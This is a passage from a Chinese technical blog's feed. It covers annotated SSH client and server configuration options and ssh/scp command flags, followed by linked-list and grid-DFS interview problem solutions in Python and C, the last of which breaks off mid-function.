class="line">#   BatchMode no                   # 如果设置为&quot;yes&quot;，将禁止passphrase&#x2F;password询问。比较适用于在那些不需要询问提供密</span><br><span class="line">                                   # 码的脚本或批处理任务任务中。默认为&quot;no&quot;。</span><br><span class="line">#   CheckHostIP yes</span><br><span class="line">#   AddressFamily any</span><br><span class="line">#   ConnectTimeout 0</span><br><span class="line">#   StrictHostKeyChecking ask        # 设置为&quot;yes&quot;，ssh将从不自动添加host key到~&#x2F;.ssh&#x2F;known_hosts文件，</span><br><span class="line">                                     # 且拒绝连接那些未知的主机(即未保存host key的主机或host key已改变的主机)。</span><br><span class="line">                                     # 它将强制用户手动添加host key到~&#x2F;.ssh&#x2F;known_hosts中。</span><br><span class="line">                                     # 设置为ask将询问是否保存到~&#x2F;.ssh&#x2F;known_hosts文件。</span><br><span class="line">                                     # 设置为no将自动添加到~&#x2F;.ssh&#x2F;known_hosts文件。</span><br><span class="line">#   IdentityFile ~&#x2F;.ssh&#x2F;identity     # ssh v1版使用的私钥文件</span><br><span class="line">#   IdentityFile ~&#x2F;.ssh&#x2F;id_rsa       # ssh v2使用的rsa算法的私钥文件</span><br><span class="line">#   IdentityFile ~&#x2F;.ssh&#x2F;id_dsa       # ssh v2使用的dsa算法的私钥文件</span><br><span class="line">#   Port 22                          # 当命令行中不指定端口时，默认连接的远程主机上的端口</span><br><span class="line">#   Protocol 2,1</span><br><span class="line">#   Cipher 3des                      # 指定ssh v1版本中加密会话时使用的加密协议</span><br><span class="line">#   Ciphers aes128-ctr,aes192-ctr,aes256-ctr,arcfour256,arcfour128,aes128-cbc,3des-cbc  # 指定ssh v1版本中加密会话时使用的加密协议</span><br><span class="line">#   MACs hmac-md5,hmac-sha1,umac-64@openssh.com,hmac-ripemd160</span><br><span class="line">#   EscapeChar ~</span><br><span class="line">#   Tunnel no</span><br><span class="line">#   TunnelDevice any:any</span><br><span class="line">#   PermitLocalCommand no    # 功能等价于~&#x2F;.ssh&#x2F;rc，表示是否允许ssh连接成功后在本地执行LocalCommand指令指定的命令。</span><br><span class="line">#   LocalCommand             # 指定连接成功后要在本地执行的命令列表，当PermitLocalCommand设置为no时将自动忽略该配置</span><br><span class="line">                             # %d表本地用户家目录，%h表示远程主机名，%l表示本地主机名，%n表示命令行上提供的主机名，</span><br><span class="line">                             # p%表示远程ssh端口，r%表示远程用户名，u%表示本地用户名。</span><br><span class="line">#   VisualHostKey no         # 是否开启主机验证阶段时host key的图形化指纹</span><br><span class="line">Host *</span><br><span class="line">        GSSAPIAuthentication yes</span><br></pre></td></tr></table></figure><h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h4><p>一般修改默认端口以及不适用dns解析即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">#Port 22                # 服务端SSH端口，可以指定多条表示监听在多个端口上</span><br><span class="line">#ListenAddress 0.0.0.0  # 监听的IP地址。0.0.0.0表示监听所有IP</span><br><span class="line">Protocol 2              # 使用SSH 2版本</span><br><span class="line"> </span><br><span class="line">#####################################</span><br><span class="line">#          私钥保存位置               #</span><br><span class="line">#####################################</span><br><span class="line"># HostKey for protocol version 1</span><br><span class="line">#HostKey &#x2F;etc&#x2F;ssh&#x2F;ssh_host_key      # SSH 1保存位置&#x2F;etc&#x2F;ssh&#x2F;ssh_host_key</span><br><span class="line"># HostKeys for protocol version 2</span><br><span class="line">#HostKey &#x2F;etc&#x2F;ssh&#x2F;ssh_host_rsa_key  # SSH 2保存RSA位置&#x2F;etc&#x2F;ssh&#x2F;ssh_host_rsa _key</span><br><span class="line">#HostKey &#x2F;etc&#x2F;ssh&#x2F;ssh_host_dsa_key  # SSH 2保存DSA位置&#x2F;etc&#x2F;ssh&#x2F;ssh_host_dsa _key</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">###################################</span><br><span class="line">#           杂项配置               #</span><br><span class="line">###################################</span><br><span class="line">#PidFile &#x2F;var&#x2F;run&#x2F;sshd.pid        # 服务程序sshd的PID的文件路径</span><br><span class="line">#ServerKeyBits 1024               # 服务器生成的密钥长度</span><br><span class="line">#SyslogFacility AUTH              # 使用哪个syslog设施记录ssh日志。日志路径默认为&#x2F;var&#x2F;log&#x2F;secure</span><br><span class="line">#LogLevel INFO                    # 记录SSH的日志级别为INFO</span><br><span class="line"> </span><br><span class="line">###################################</span><br><span class="line">#   以下项影响认证速度               #</span><br><span class="line">###################################</span><br><span class="line">#UseDNS yes                       # 指定是否将客户端主机名解析为IP，以检查此主机名是否与其IP地址真实对应。默认yes。</span><br><span class="line">                                  # 由此可知该项影响的是主机验证阶段。建议在未配置DNS解析时，将其设置为no，否则主机验证阶段会很慢</span><br><span class="line"> </span><br><span class="line">###################################</span><br><span class="line">#   以下是和安全有关的配置           #</span><br><span class="line">###################################</span><br><span class="line">#PermitRootLogin yes              # 是否允许root用户登录</span><br><span class="line">#GSSAPIAuthentication no          # 是否开启GSSAPI身份认证机制，默认为yes</span><br><span class="line">#PubkeyAuthentication yes         # 是否开启基于公钥认证机制</span><br><span class="line">#AuthorizedKeysFile  .ssh&#x2F;authorized_keys  # 基于公钥认证机制时，来自客户端的公钥的存放位置</span><br><span class="line">PasswordAuthentication yes        # 是否使用密码验证，如果使用密钥对验证可以关了它</span><br><span class="line">#PermitEmptyPasswords no          # 是否允许空密码，如果上面的那项是yes，这里最好设置no</span><br><span class="line">#MaxSessions 10                   # 最大客户端连接数量</span><br><span class="line">#LoginGraceTime 2m                # 身份验证阶段的超时时间，若在此超时期间内未完成身份验证将自动断开</span><br><span class="line">#MaxAuthTries 6                   # 指定每个连接最大允许的认证次数。默认值是6。</span><br><span class="line">                                  # 如果失败认证次数超过该值一半，将被强制断开，且生成额外日志消息。</span><br><span class="line">MaxStartups 10                    # 最大允许保持多少个未认证的连接。默认值10。</span><br><span class="line"></span><br><span class="line">###################################</span><br><span class="line">#   以下可以自行添加到配置文件        #</span><br><span class="line">###################################</span><br><span class="line">DenyGroups  hellogroup testgroup  # 表示hellogroup和testgroup组中的成员不允许使用sshd服务，即拒绝这些用户连接</span><br><span class="line">DenyUsers   hello test            # 表示用户hello和test不能使用sshd服务，即拒绝这些用户连接</span><br><span class="line"> </span><br><span class="line">###################################</span><br><span class="line">#   以下一项和远程端口转发有关        #</span><br><span class="line">###################################</span><br><span class="line">#GatewayPorts no                  # 设置为yes表示sshd允许被远程主机所设置的本地转发端口绑定在非环回地址上</span><br><span class="line">                                  # 默认值为no，表示远程主机设置的本地转发端口只能绑定在环回地址上，见后文&quot;远程端口转发&quot;</span><br></pre></td></tr></table></figure><h3 id="ssh命令"><a href="#ssh命令" class="headerlink" title="ssh命令"></a>ssh命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ssh [options] [user@]hostname [command]</span><br><span class="line"> </span><br><span class="line">参数说明：</span><br><span class="line">-b bind_address # 在本地主机上绑定用于ssh连接的地址，当系统有多个ip时才生效。</span><br><span class="line">-E log_file     # 将debug日志写入到log_file中，而不是默认的标准错误输出stderr。</span><br><span class="line">-F configfile   # 指定用户配置文件，默认为~&#x2F;.ssh&#x2F;config。</span><br><span class="line">-f              # 请求ssh在工作在后台模式。该选项隐含了&quot;-n&quot;选项，所以标准输入将变为&#x2F;dev&#x2F;null。</span><br><span class="line">-i identity_file# 指定公钥认证时要读取的私钥文件。默认为~&#x2F;.ssh&#x2F;id_rsa。</span><br><span class="line">-l login_name   # 指定登录在远程机器上的用户名。也可以在全局配置文件中设置。</span><br><span class="line">-N              # 显式指明ssh不执行远程命令。一般用于端口转发，见后文端口转发的示例分析。</span><br><span class="line">-n              #将&#x2F;dev&#x2F;null作为标准输入stdin，可以防止从标准输入中读取内容。ssh在后台运行时默认该项。</span><br><span class="line">-p port         # 指定要连接远程主机上哪个端口，也可在全局配置文件中指定默认的连接端口。</span><br><span class="line">-q              # 静默模式。大多数警告信息将不输出。</span><br><span class="line">-T              # 禁止为ssh分配伪终端。</span><br><span class="line">-t              # 强制分配伪终端，重复使用该选项&quot;-tt&quot;将进一步强制。</span><br><span class="line">-v              # 详细模式，将输出debug消息，可用于调试。&quot;-vvv&quot;可更详细。</span><br><span class="line">-V              # 显示版本号并退出。</span><br><span class="line">-o              # 指定额外选项，选项非常多。</span><br><span class="line">user@hostname   # 指定ssh以远程主机hostname上的用户user连接到的远程主机上，若省略user部分，则表示使用本地当前用户。</span><br><span class="line">                # 如果在hostname上不存在user用户，则连接将失败(将不断进行身份验证)。</span><br><span class="line">command         # 要在远程主机上执行的命令。指定该参数时，ssh的行为将不再是登录，而是执行命令，命令执行完毕时ssh连接就关闭。</span><br></pre></td></tr></table></figure><h3 id="scp命令"><a href="#scp命令" class="headerlink" title="scp命令"></a>scp命令</h3><p>scp的拷贝实质是建立ssh连接，然后通过此连接来传输数据。如果是远程1拷贝到远程2，则是将scp命令转换后发送到远程1上执行，在远程1上建立和远程2的ssh连接，并通过此连接来传输数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">scp [-12BCpqrv] [-l limit] [-o ssh_option] [-P port] [[user@]host1:]src_file ... [[user@]host2:]dest_file</span><br><span class="line"></span><br><span class="line">选项说明：</span><br><span class="line">-1：使用ssh v1版本，这是默认使用协议版本</span><br><span class="line">-2：使用ssh v2版本</span><br><span class="line">-C：拷贝时先压缩，节省带宽</span><br><span class="line">-l limit：限制拷贝速度，Kbit&#x2F;s，1Byte&#x3D;8bit，所以&quot;-l 800&quot;表示的速率是100K&#x2F;S</span><br><span class="line">-o ssh_option：指定ssh连接时的特殊选项，一般用不上。</span><br><span class="line">-P port：指定目标主机上ssh端口，大写的字母P，默认是22端口</span><br><span class="line">-p：拷贝时保持源文件的mtime,atime,owner,group,privileges</span><br><span class="line">-r：递归拷贝，用于拷贝目录。注意，scp拷贝遇到链接文件时，会拷贝链接的源文件内容填充到目标文件中(scp的本质就是填充而非拷贝)</span><br><span class="line">-v：输出详细信息，可以用来调试或查看scp的详细过程，分析scp的机制</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;基础&quot;&gt;&lt;a href=&quot;#基础&quot; class=&quot;headerlink&quot; title=&quot;基础&quot;&gt;&lt;/a&gt;基础&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;ssh是一个基于传输层和应用层的安全协议，它使用对称密钥来进行会话之间加密，使用非对称密钥来进行身份的验证（关于密钥相关的知识在“运维安全基础”里已经做了基本介绍）&lt;/li&gt;
&lt;li&gt;ssh服务端守护进程为sshd，默认监听在22端口，一般安全起见可以通过配置文件修改&lt;/li&gt;
&lt;li&gt;ssh验证过程主要分为主机认证和身份认证两方面。主机认证用于记录连接主机的身份，可以记录每个主机连接多少个用户；身份认证一般通过公钥私钥的非对称密钥进行通信确认。&lt;/li&gt;
&lt;li&gt;ssh客户端配置文件为/etc/ssh/ssh_config，服务端配置文件为/etc/ssh/sshd_config&lt;/li&gt;
&lt;li&gt;做ssh服务端时，会有服务端自己的私钥和公钥用于建立连接使用，存放在/etc/ssh目录下，最下面两个即为用于连接认证的公钥和私钥。&lt;/li&gt;
&lt;li&gt;ssh执行后在对端开启一个伪终端来执行后续操作，如果身份认证不能使用伪终端，那么认证会失败。&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
    
      <category term="ssh" scheme="http://yoursite.com/tags/ssh/"/>
    
      <category term="scp" scheme="http://yoursite.com/tags/scp/"/>
    
  </entry>
  
  <entry>
    <title>13链表中倒数第k个指针</title>
    <link href="http://yoursite.com/2020/02/28/13%E9%93%BE%E8%A1%A8%E4%B8%AD%E5%80%92%E6%95%B0%E7%AC%ACk%E4%B8%AA%E6%8C%87%E9%92%88/"/>
    <id>http://yoursite.com/2020/02/28/13%E9%93%BE%E8%A1%A8%E4%B8%AD%E5%80%92%E6%95%B0%E7%AC%ACk%E4%B8%AA%E6%8C%87%E9%92%88/</id>
    <published>2020-02-28T07:58:38.000Z</published>
    <updated>2020-02-28T07:59:54.404Z</updated>
    
    <content type="html"><![CDATA[<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>输入一个链表，输出该链表中倒数第k个节点。为了符合大多数人的习惯，本题从1开始计数，即链表的尾节点是倒数第1个节点。例如，一个链表有6个节点，从头节点开始，它们的值依次是1、2、3、4、5、6。这个链表的倒数第3个节点是值为4的节点。</p><a id="more"></a><p><strong>示例：</strong></p><p>给定一个链表: </p><p><code>1-&gt;2-&gt;3-&gt;4-&gt;5, 和 k = 2.</code></p><p>返回链表 </p><p><code>4-&gt;5.</code></p><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getKthFromEnd</span><span class="params">(self, head, k)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type head: ListNode</span></span><br><span class="line"><span class="string">        :type k: int</span></span><br><span class="line"><span class="string">        :rtype: ListNode</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> head: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        p1=head</span><br><span class="line">        p2=head</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> range(k):</span><br><span class="line">            <span class="keyword">if</span> p1:</span><br><span class="line">                p1=p1.next</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">while</span> p1:</span><br><span class="line">            p1=p1.next</span><br><span class="line">            p2=p2.next</span><br><span class="line">        <span class="keyword">return</span> p2</span><br></pre></td></tr></table></figure><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> val;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">struct ListNode* <span class="title">getKthFromEnd</span><span class="params">(struct ListNode* head, <span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(head==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">p1</span>=<span class="title">head</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">p2</span>=<span class="title">head</span>;</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;k;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        p1=p1-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(p1)</span><br><span class="line">   &#123;</span><br><span class="line">        p1=p1-&gt;next;</span><br><span class="line">        p2=p2-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> p2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;问题&quot;&gt;&lt;a href=&quot;#问题&quot; class=&quot;headerlink&quot; title=&quot;问题&quot;&gt;&lt;/a&gt;问题&lt;/h3&gt;&lt;p&gt;输入一个链表，输出该链表中倒数第k个节点。为了符合大多数人的习惯，本题从1开始计数，即链表的尾节点是倒数第1个节点。例如，一个链表有6个节点，从头节点开始，它们的值依次是1、2、3、4、5、6。这个链表的倒数第3个节点是值为4的节点。&lt;/p&gt;
    
    </summary>
    
    
      <category term="剑指offer" scheme="http://yoursite.com/categories/%E5%89%91%E6%8C%87offer/"/>
    
    
  </entry>
  
  <entry>
    <title>12反转链表</title>
    <link href="http://yoursite.com/2020/02/28/12%E5%8F%8D%E8%BD%AC%E9%93%BE%E8%A1%A8/"/>
    <id>http://yoursite.com/2020/02/28/12%E5%8F%8D%E8%BD%AC%E9%93%BE%E8%A1%A8/</id>
    <published>2020-02-28T07:58:00.000Z</published>
    <updated>2020-02-28T07:59:50.897Z</updated>
    
    <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>定义一个函数，输入一个链表的头节点，反转该链表并输出反转后链表的头节点。</p><a id="more"></a><p><strong>示例:</strong></p><p><strong>输入:</strong> </p><p><code>1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL</code></p><p><strong>输出:</strong> </p><p><code>5-&gt;4-&gt;3-&gt;2-&gt;1-&gt;NULL</code></p><p><strong>限制：</strong></p><p><code>0 &lt;= 节点个数 &lt;= 5000</code></p><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListNode</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        self.val = x</span><br><span class="line">        self.next = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverseList</span><span class="params">(self, pHead)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> pHead:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        head = ListNode(<span class="number">0</span>)</span><br><span class="line">        head.next = pHead</span><br><span class="line">        p = pHead</span><br><span class="line">        <span class="keyword">while</span> p.next:               <span class="comment"># 当前节点</span></span><br><span class="line">            tp = p.next             <span class="comment"># 下一个节点</span></span><br><span class="line">            p.next = p.next.next    <span class="comment"># 当前节点后移</span></span><br><span class="line">            tp.next = head.next     <span class="comment"># 下一个节点的下一个是头节点的下一个</span></span><br><span class="line">            head.next = tp          <span class="comment"># 头节点的下一个是下一个节点</span></span><br><span class="line">        <span class="keyword">return</span> head.next</span><br></pre></td></tr></table></figure><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> val;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">struct ListNode* <span class="title">reverseList</span><span class="params">(struct ListNode* head)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">newhead</span> = <span class="title">head</span>;</span></span><br><span class="line">    head = head-&gt;next;</span><br><span class="line">    newhead-&gt;next = <span class="literal">NULL</span>; <span class="comment">// 避免造成循环</span></span><br><span class="line">    <span class="keyword">while</span> (head != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">node</span> = <span class="title">head</span>-&gt;<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">        head-&gt;next = newhead; <span class="comment">// 前插</span></span><br><span class="line">        newhead = head;       <span class="comment">// newhead重新指向新的头结点</span></span><br><span class="line"></span><br><span class="line">        head = node;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> newhead;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;定义一个函数，输入一个链表的头节点，反转该链表并输出反转后链表的头节点。&lt;/p&gt;
    
    </summary>
    
    
      <category term="剑指offer" scheme="http://yoursite.com/categories/%E5%89%91%E6%8C%87offer/"/>
    
    
  </entry>
  
  <entry>
    <title>11机器人的运动范围</title>
    <link href="http://yoursite.com/2020/02/28/11%E6%9C%BA%E5%99%A8%E4%BA%BA%E7%9A%84%E8%BF%90%E5%8A%A8%E8%8C%83%E5%9B%B4/"/>
    <id>http://yoursite.com/2020/02/28/11%E6%9C%BA%E5%99%A8%E4%BA%BA%E7%9A%84%E8%BF%90%E5%8A%A8%E8%8C%83%E5%9B%B4/</id>
    <published>2020-02-28T07:57:19.000Z</published>
    <updated>2020-02-28T07:59:47.789Z</updated>
    
    <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>地上有一个m行n列的方格，从坐标 [0,0] 到坐标 [m-1,n-1] 。一个机器人从坐标 [0, 0] 的格子开始移动，它每次可以向左、右、上、下移动一格（不能移动到方格外），也不能进入行坐标和列坐标的数位之和大于k的格子。例如，当k为18时，机器人能够进入方格 [35, 37] ，因为3+5+3+7=18。但它不能进入方格 [35, 38]，因为3+5+3+8=19。请问该机器人能够到达多少个格子？</p><a id="more"></a><p><strong>示例 1：</strong></p><p><strong>输入：</strong></p><p><code>m = 2, n = 3, k = 1</code></p><p><strong>输出：</strong></p><p><code>3</code></p><p><strong>示例 2：</strong></p><p><strong>输入：</strong></p><p><code>m = 3, n = 1, k = 0</code></p><p><strong>输出：</strong></p><p><code>1</code></p><p><strong>提示：</strong></p><p><code>1 &lt;= n,m &lt;= 100</code><br><code>0 &lt;= k &lt;= 20</code></p><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#与矩阵那题类似，DFS函数用于统计可以走多少次，cal函数用于计算是否可以进入方格</span></span><br><span class="line"><span class="comment">#由于要统计可以走的步数，因此不返回True和False而是返回0并且成功就+1</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">movingCount</span><span class="params">(self, m, n, k)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type m: int</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :type k: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        visited=[[<span class="literal">False</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(n)] <span class="keyword">for</span> _ <span class="keyword">in</span> range(m)]</span><br><span class="line">        <span class="keyword">return</span> self.DFS(<span class="number">0</span>,<span class="number">0</span>,m,n,visited,k)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">DFS</span><span class="params">(self,i,j,m,n,visited,k)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> i &lt; <span class="number">0</span> <span class="keyword">or</span> i &gt;= m <span class="keyword">or</span> j &lt; <span class="number">0</span> <span class="keyword">or</span> j &gt;= n <span class="keyword">or</span> self.cal(i) + self.cal(j) &gt; k <span class="keyword">or</span> visited[i][j] == <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        visited[i][j]=<span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> self.DFS(i<span class="number">-1</span>,j,m,n,visited,k)+self.DFS(i,j<span class="number">-1</span>,m,n,visited,k)+self.DFS(i+<span class="number">1</span>,j,m,n,visited,k)+self.DFS(i,j+<span class="number">1</span>,m,n,visited,k)+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cal</span><span class="params">(self,num)</span>:</span></span><br><span class="line">        total=<span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> num &gt; <span class="number">0</span>:</span><br><span class="line">            total+=num%<span class="number">10</span></span><br><span class="line">            num//=<span class="number">10</span></span><br><span class="line">        <span class="keyword">return</span> total</span><br></pre></td></tr></table></figure><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">movingCount</span><span class="params">(<span class="keyword">int</span> m, 